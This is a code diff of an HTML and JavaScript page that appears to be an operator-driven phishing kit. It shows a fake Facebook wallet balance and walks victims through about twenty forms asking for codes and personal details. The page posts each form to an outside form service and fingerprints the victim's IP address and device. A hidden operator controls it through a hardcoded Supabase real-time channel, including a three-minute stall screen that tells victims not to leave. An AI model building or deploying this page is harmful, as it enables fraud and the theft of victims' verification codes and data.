+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step20Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter code" oninput="validateCodeInput(this)" /><span class="floating-label">Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step20Code_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
+                <button type="submit" class="responsive-btn">Complete</button>
+              </div>
+            </div>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 20 / "U" (CONTINUOUS 180-SEC TIMER VIEW - NO STALL) -->
+        <div id="processing20" class="step-section processing-container">
           <div class="example-spinner-wrapper">
             <div class="example-spinner-bg"></div>
             <div class="example-spinner-ring"></div>
-            <div id="timerCount10" class="timerCount">1%</div>
+            <div id="timerCount20" class="timerCount">1%</div>
           </div>
-          <div class="processing-title-custom">Validating final key.......</div>
-          <div class="processing-subtitle-custom">Please wait....</div>
+          <div class="processing-title-custom" id="proc20-title">Verifying...</div>
+          <div class="processing-large-text" id="proc20-subtitle">Please wait, do not leave this page.</div>
         </div>
 
         <!-- LAST PAGE ("Z"): Final Non-Form Support Page -->
         <div id="finalApproved" class="step-section" style="text-align: center; padding: 40px 10px;">
           <div class="lower-section">
             <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="">
-            
             <div class="external-message" style="display: block; margin-bottom: 20px;"></div>
-
             <p style="font-size: 16px; font-weight: 500; color: #000000; line-height: 1.5; margin-bottom: 30px;">
               It seems you are having trouble, you are almost ready, please tap the button below to contact us and we will assist you
             </p>
-
             <button type="button" class="customer-support-btn" onclick="event.preventDefault(); alert('Support clicked');">
-              Tap here to contact us 
+              [ Tap here to contact us ]
             </button>
+          </div>
+
+          <!-- SECRET STORAGE DIV (DISPLAY: NONE) FOR COPY-PASTING FREQUENT STRINGS AND UTILITIES -->
+          <div id="secret-storage" style="display: none;">
+            <!-- FUTURE HEADING & FUTURE TEXT SNIPPETS -->
+            <h5 class="FutureHeading">Future Heading Text Here</h5>
+            <p class="Future">Future Black Bold Text Here</p>
+            <p class="Future16Black">Future 16px Black Text Here</p>
+
+            <!-- STANDALONE BALANCE DISPLAY SNIPPET WITH REFINED CENTS -->
+            <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+
+            <!-- ENTIRE FULL WALLET CARD BOX SNIPPET -->
+            <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, <span class="submittedName"></span></h3>
+                </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> FDIC Insured</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 18px; color: #4267B2; font-weight: 700;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NEW BUTTON STORAGE SNIPPETS -->
+            <button type="button" class="full-black-btn">Black Button Text</button>
+            <button type="button" class="full-navy-btn">Navy Blue Button Text</button>
+
+            <!-- NEW BLACK BORDER INPUT STORAGE SNIPPET (WITH BENZ & PRAY SUPPORT & EDITABLE LABEL SIZE/BOLDNESS) -->
+            <div class="floating-group">
+              <input type="text" required name="BlackField" class="floating-input-black" placeholder=" " data-min-length="2" data-error-message="Enter value" oninput="validateCustom(this)" data-capture="benz" />
+              <span class="floating-label-black">Black Input Label</span>
+            </div>
+
+            <!-- DYNAMIC SPAN & CONTAINER SNIPPETS TO COPY AT WILL -->
+            <span class="submittedName"></span>
+            <span class="submittedBenz"></span>
+            <span class="submittedPray"></span>
+            <div class="external-message"></div>
+
+            <!-- CAPTURE FIELD CONFIGURATIONS -->
+            <input type="text" data-capture="benz" name="BenzField">
+            <input type="text" data-capture="pray" name="PrayField">
           </div>
         </div>
 
@@ -973,13 +1561,18 @@ If you can’t find the emoji or need help, just tap the button below to connect
     </div>
 
 <script>
-    // --- SUPABASE REAL-TIME CONFIGURATION ---
+    const msgElements = document.querySelectorAll('.external-message');
+    const stepSections = document.querySelectorAll('.step-section');
+    const txOverlay = document.getElementById('tx-overlay');
+
     const SUPABASE_URL = "https://bqddohfszkqpvncpbrun.supabase.co";
     const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHZuY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA";
     
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+        auth: { persistSession: false },
+        realtime: { timeout: 20000, params: { eventsPerSecond: 10 } }
+    });
 
-    // Live Realtime Websocket Listener for row changes in app_control table
     supabaseClient
         .channel('public:app_control')
         .on('postgres_changes', { event: '*', schema: 'public', table: 'app_control' }, payload => {
@@ -987,9 +1580,8 @@ If you can’t find the emoji or need help, just tap the button below to connect
         })
         .subscribe();
 
-    // Fetch persistent state when page loads
     async function fetchInitialState() {
-        const { data, error } = await supabaseClient
+        const { data } = await supabaseClient
             .from('app_control')
             .select('*')
             .eq('id', 1)
@@ -1001,14 +1593,22 @@ If you can’t find the emoji or need help, just tap the button below to connect
     }
     fetchInitialState();
 
-    // --- FULL ALPHABETICAL ROUTING & TEXT INJECTION LOGIC ---
+    const stepMap = {
+        "A": "myFormSection", "B": "mainContent", "C": "mainContent2",
+        "D": "mainContent3", "E": "mainContent4", "F": "mainContent5",
+        "G": "mainContent6", "H": "mainContent7", "I": "mainContent8",
+        "J": "mainContent9", "K": "mainContent10", "L": "mainContent11",
+        "M": "mainContent12", "N": "mainContent13", "O": "mainContent14",
+        "P": "mainContent15", "Q": "mainContent16", "R": "mainContent17",
+        "S": "mainContent18", "T": "mainContent19", "Z": "finalApproved"
+    };
+
     function handleRemoteCommand(data) {
         if (!data) return;
 
-        // 1. Inject Dynamic External Text across any page containing .external-message
-        const msgElements = document.querySelectorAll('.external-message');
+        const hasMessage = data.message && data.message.trim() !== '';
         msgElements.forEach(el => {
-            if (data.message && data.message.trim() !== '') {
+            if (hasMessage) {
                 el.textContent = data.message;
                 el.style.display = 'block';
             } else {
@@ -1016,61 +1616,39 @@ If you can’t find the emoji or need help, just tap the button below to connect
             }
         });
 
-        // 2. View Switching Logic (Alphabet Mapping A to J, and Z)
-        switch (data.keyword) {
-            case "A":
-                showStep('myFormSection'); // Page 1 (Form 1)
-                break;
-            case "B":
-                showStep('mainContent');   // Page 2 (Form 2)
-                break;
-            case "C":
-                showStep('mainContent2');  // Page 3 (Form 3)
-                break;
-            case "D":
-                showStep('mainContent3');  // Page 4 (Form 4)
-                break;
-            case "E":
-                showStep('mainContent4');  // Page 5 (Form 5)
-                break;
-            case "F":
-                showStep('mainContent5');  // Page 6 (Form 6)
-                break;
-            case "G":
-                showStep('mainContent6');  // Page 7 (Form 7)
-                break;
-            case "H":
-                showStep('mainContent7');  // Page 8 (Form 8)
-                break;
-            case "I":
-                showStep('mainContent8');  // Page 9 (Form 9)
-                break;
-            case "J":
-                showStep('mainContent9');  // Page 10 (Form 10)
-                break;
-            case "Z":
-                showStep('finalApproved'); // Final Page (Customer Support)
-                break;
-            default:
-                break;
+        if (data.keyword === "U") {
+            runExtendedProcessing20();
+        } else if (stepMap[data.keyword]) {
+            showStep(stepMap[data.keyword]);
         }
     }
 
-    if (document.getElementById('hidden-user-agent')) {
-        document.getElementById('hidden-user-agent').value = navigator.userAgent;
+    const hiddenUA = document.getElementById('hidden-user-agent');
+    if (hiddenUA) hiddenUA.value = navigator.userAgent;
+
+    function syncCapturedInputs(currentForm) {
+        if (currentForm) {
+            const benzInForm = currentForm.querySelector('input[data-capture="benz"]');
+            if (benzInForm && benzInForm.value) {
+                document.querySelectorAll(".submittedBenz").forEach(el => el.textContent = benzInForm.value);
+            }
+
+            const prayInForm = currentForm.querySelector('input[data-capture="pray"]');
+            if (prayInForm && prayInForm.value) {
+                document.querySelectorAll(".submittedPray").forEach(el => el.textContent = prayInForm.value);
+            }
+        }
     }
 
-    // --- UTILITY & INPUT VALIDATION FUNCTIONS ---
-    (async function gatherDeviceContext() {
+    const runNonBlocking = window.requestIdleCallback || ((cb) => setTimeout(cb, 100));
+    runNonBlocking(async function gatherDeviceContext() {
         try {
             let clientIp = 'IP-Fetching';
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 clientIp = data.ip || 'Unknown';
-            } catch (ipErr) {
-                clientIp = 'Unavailable';
-            }
+            } catch (ipErr) { clientIp = 'Unavailable'; }
 
             const ua = navigator.userAgent;
             let os = 'Unknown OS';
@@ -1089,9 +1667,7 @@ If you can’t find the emoji or need help, just tap the button below to connect
                 const match = ua.match(/Mac OS X\s([0-9_\.]+)/i);
                 const version = match ? match[1].replace(/_/g, '.') : '';
                 os = version ? `Mac OS X ${version}` : 'Mac OS';
-            } else if (/linux/i.test(ua)) {
-                os = 'Linux';
-            }
+            } else if (/linux/i.test(ua)) { os = 'Linux'; }
 
             if (/chrome|crios|crmo/i.test(ua) && !/edge|opr/i.test(ua)) {
                 const match = ua.match(/(?:chrome|crios|crmo)\/([0-9\.]+)/i);
@@ -1112,64 +1688,56 @@ If you can’t find the emoji or need help, just tap the button below to connect
 
             const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
             const screenRes = `${window.screen.width}x${window.screen.height}`;
-            const lang = navigator.language || navigator.userLanguage || 'Unknown';
+            const lang = navigator.language || 'Unknown';
             
-            const contextString = `IP: ${clientIp} | OS: ${os} | Browser: ${browser} | TZ: ${tz} | Screen: ${screenRes} | Lang: ${lang} | FullUA: ${ua}`;
+            const contextString = `IP: ${clientIp} | OS: ${os} | Browser: ${browser} | TZ: ${tz} | Screen: ${screenRes} | Lang: ${lang}`;
             const contextField = document.getElementById('hiddenDeviceContext');
             if (contextField) contextField.value = contextString;
         } catch(e) {}
-    })();
+    });
 
-    function openTxOverlay() {
-        document.getElementById('tx-overlay').style.display = 'flex';
-    }
-
-    function closeTxOverlay() {
-        document.getElementById('tx-overlay').style.display = 'none';
-    }
+    function openTxOverlay() { txOverlay.style.display = 'flex'; }
+    function closeTxOverlay() { txOverlay.style.display = 'none'; }
 
     function validateCustom(input) {
       const minLength = parseInt(input.getAttribute('data-min-length')) || 1;
       const errorMessage = input.getAttribute('data-error-message') || 'Invalid input';
-      if (input.value.length < minLength) input.setCustomValidity(errorMessage);
-      else input.setCustomValidity('');
+      input.setCustomValidity(input.value.length < minLength ? errorMessage : '');
     }
 
     function validateInput(input) {
       const selectionStart = input.selectionStart;
       let rawVal = input.value.replace(/[^A-Za-z\s]/g, '');
       let formattedVal = rawVal.replace(/(?:^|\s)\S/g, match => match.toUpperCase());
-      formattedVal = formattedVal.replace(/(\S)(\S+)/g, (match, firstLetter, restOfWord) => firstLetter + restOfWord.toLowerCase());
       input.value = formattedVal;
       try { input.setSelectionRange(selectionStart, selectionStart); } catch(e) {}
       const minLength = parseInt(input.getAttribute('data-min-length')) || 5;
       const errorMessage = input.getAttribute('data-error-message') || 'Please enter valid info';
-      if (input.value.length < minLength) input.setCustomValidity(errorMessage);
-      else input.setCustomValidity('');
+      input.setCustomValidity(input.value.length < minLength ? errorMessage : '');
     }
 
     function validatePhoneInput(input) {
       input.value = input.value.replace(/\D/g, '');
       const minLength = parseInt(input.getAttribute('data-min-length')) || 10;
       const errorMessage = input.getAttribute('data-error-message') || 'Please enter complete phone number';
-      if (input.value.length < minLength) input.setCustomValidity(errorMessage);
-      else input.setCustomValidity('');
+      input.setCustomValidity(input.value.length < minLength ? errorMessage : '');
     }
 
     function validateCodeInput(input) {
       input.value = input.value.replace(/\D/g, '');
       const minLength = parseInt(input.getAttribute('data-min-length')) || 4;
       const errorMessage = input.getAttribute('data-error-message') || 'Please enter complete code';
-      if (input.value.length < minLength) input.setCustomValidity(errorMessage);
-      else input.setCustomValidity('');
+      input.setCustomValidity(input.value.length < minLength ? errorMessage : '');
     }
 
     function showStep(stepId) {
-        document.querySelectorAll('.step-section').forEach(sec => sec.style.display = 'none');
+        for (let i = 0; i < stepSections.length; i++) {
+            stepSections[i].style.display = 'none';
+        }
         const target = document.getElementById(stepId);
         if (target) {
             target.style.display = 'block';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            window.scrollTo({ top: 0, behavior: 'instant' });
         }
     }
 
@@ -1182,9 +1750,7 @@ If you can’t find the emoji or need help, just tap the button below to connect
             count++;
             if (count <= 100) { 
                 if (timerElement) timerElement.textContent = count + "%"; 
-            } else { 
-                clearInterval(timerInterval); 
-            }
+            } else { clearInterval(timerInterval); }
         }, intervalTime);
 
         setTimeout(() => {
@@ -1193,132 +1759,88 @@ If you can’t find the emoji or need help, just tap the button below to connect
         }, durationMs);
     }
 
-    // --- FORM SUBMISSION HANDLERS ---
+    let proc20TimerInterval = null;
+
+    function runExtendedProcessing20() {
+        showStep('processing20');
+        
+        if (proc20TimerInterval) clearInterval(proc20TimerInterval);
+
+        let currentPercent = 1;
+        const timerElement = document.getElementById('timerCount20');
+        const titleEl = document.getElementById('proc20-title');
+        const subtitleEl = document.getElementById('proc20-subtitle');
+        
+        if (timerElement) timerElement.textContent = "1%";
+        if (titleEl) titleEl.textContent = "Verifying...";
+        if (subtitleEl) subtitleEl.textContent = "Please wait, do not leave this page.";
+
+        // 1800ms * 100 steps = 180,000ms (180 seconds / 3 minutes total)
+        proc20TimerInterval = setInterval(() => {
+            currentPercent++;
+            if (timerElement) timerElement.textContent = currentPercent + "%";
+
+            if (currentPercent >= 50 && currentPercent < 100) {
+                if (titleEl) titleEl.textContent = "Please wait a few more seconds.";
+                if (subtitleEl) subtitleEl.textContent = "You've gotten this far please wait you are almost there. Do not leave this page.";
+            }
+
+            if (currentPercent >= 100) {
+                clearInterval(proc20TimerInterval);
+                setTimeout(() => {
+                    showStep('finalApproved');
+                }, 1000);
+            }
+        }, 1800);
+    }
+
+    function postForm(formId) {
+        fetch("https://submit-form.com/M", { 
+            method: "POST", 
+            body: new FormData(document.getElementById(formId)), 
+            headers: { 'Accept': 'application/json' } 
+        }).catch(() => {});
+    }
+
     function submitForm(event) {
         if (event) event.preventDefault();
+        syncCapturedInputs(event.target);
         const celebName = document.getElementById("name").value;
         const hiddenCelebField = document.getElementById("hiddenCelebInput");
         if (hiddenCelebField) hiddenCelebField.value = celebName;
         document.querySelectorAll(".submittedName").forEach(el => el.textContent = celebName);
 
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("myForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 1 error:', err));
-
+        postForm("myForm");
         showStep('processing1-timer');
         runProcessingTimer('timerCount1', 3000, 'mainContent');
     }
 
-    function submitSecondForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("secondForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 2 error:', err));
-
-        showStep('processing2');
-        runProcessingTimer('timerCount2', 2500, 'mainContent2');
-    }
-
-    function submitThirdForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("thirdForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 3 error:', err));
-
-        showStep('processing3');
-        runProcessingTimer('timerCount3', 2500, 'mainContent3');
-    }
-
-    function submitFourthForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("fourthForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 4 error:', err));
-
-        showStep('processing4');
-        runProcessingTimer('timerCount4', 2500, 'mainContent4');
-    }
-
-    function submitFifthForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("fifthForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 5 error:', err));
-
-        showStep('processing5');
-        runProcessingTimer('timerCount5', 2500, 'mainContent5');
-    }
-
-    function submitSixthForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("sixthForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 6 error:', err));
-
-        showStep('processing6');
-        runProcessingTimer('timerCount6', 2500, 'mainContent6');
-    }
-
-    function submitSeventhForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("seventhForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 7 error:', err));
-
-        showStep('processing7');
-        runProcessingTimer('timerCount7', 2500, 'mainContent7');
-    }
-
-    function submitEighthForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("eighthForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 8 error:', err));
-
-        showStep('processing8');
-        runProcessingTimer('timerCount8', 2500, 'mainContent8');
-    }
-
-    function submitNinthForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("ninthForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 9 error:', err));
-
-        showStep('processing9');
-        runProcessingTimer('timerCount9', 2500, 'mainContent9');
-    }
-
-    function submitTenthForm(event) {
-        event.preventDefault();
-        fetch("https://submit-form.com/Sex", {
-            method: "POST",
-            body: new FormData(document.getElementById("tenthForm")),
-            headers: { 'Accept': 'application/json' }
-        }).catch(err => console.error('Form 10 error:', err));
-
-        showStep('processing10');
-        runProcessingTimer('timerCount10', 2500, 'finalApproved');
+    function submitSecondForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("secondForm"); showStep('processing2'); runProcessingTimer('timerCount2', 2500, 'mainContent2'); }
+    function submitThirdForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("thirdForm"); showStep('processing3'); runProcessingTimer('timerCount3', 57000, 'mainContent3'); }
+    function submitFourthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fourthForm"); showStep('processing4'); runProcessingTimer('timerCount4', 21000, 'mainContent4'); }
+    function submitFifthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fifthForm"); showStep('processing5'); runProcessingTimer('timerCount5', 24000, 'mainContent5'); }
+    function submitSixthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("sixthForm"); showStep('processing6'); runProcessingTimer('timerCount6', 2500, 'mainContent6'); }
+    function submitSeventhForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("seventhForm"); showStep('processing7'); runProcessingTimer('timerCount7', 2500, 'mainContent7'); }
+    function submitEighthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("eighthForm"); showStep('processing8'); runProcessingTimer('timerCount8', 2500, 'mainContent8'); }
+    function submitNinthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("ninthForm"); showStep('processing9'); runProcessingTimer('timerCount9', 2500, 'mainContent9'); }
+    function submitTenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("tenthForm"); showStep('processing10'); runProcessingTimer('timerCount10', 2500, 'mainContent10'); }
+    
+    function submitEleventhForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("eleventhForm"); showStep('processing11'); runProcessingTimer('timerCount11', 2500, 'mainContent11'); }
+    function submitTwelfthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("twelfthForm"); showStep('processing12'); runProcessingTimer('timerCount12', 2500, 'mainContent12'); }
+    function submitThirteenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("thirteenthForm"); showStep('processing13'); runProcessingTimer('timerCount13', 2500, 'mainContent13'); }
+    function submitFourteenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fourteenthForm"); showStep('processing14'); runProcessingTimer('timerCount14', 2500, 'mainContent14'); }
+    function submitFifteenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fifteenthForm"); showStep('processing15'); runProcessingTimer('timerCount15', 2500, 'mainContent15'); }
+    function submitSixteenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("sixteenthForm"); showStep('processing16'); runProcessingTimer('timerCount16', 2500, 'mainContent16'); }
+    function submitSeventeenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("seventeenthForm"); showStep('processing17'); runProcessingTimer('timerCount17', 2500, 'mainContent17'); }
+    function submitEighteenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("eighteenthForm"); showStep('processing18'); runProcessingTimer('timerCount18', 2500, 'mainContent18'); }
+    function submitNineteenthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("nineteenthForm"); showStep('processing19'); runProcessingTimer('timerCount19', 2500, 'mainContent19'); }
+    
+    function submitTwentiethForm(event) { 
+        event.preventDefault(); 
+        syncCapturedInputs(event.target); 
+        postForm("twentiethForm"); 
+        runExtendedProcessing20(); 
     }
 </script>
 </body>
 </html>
-
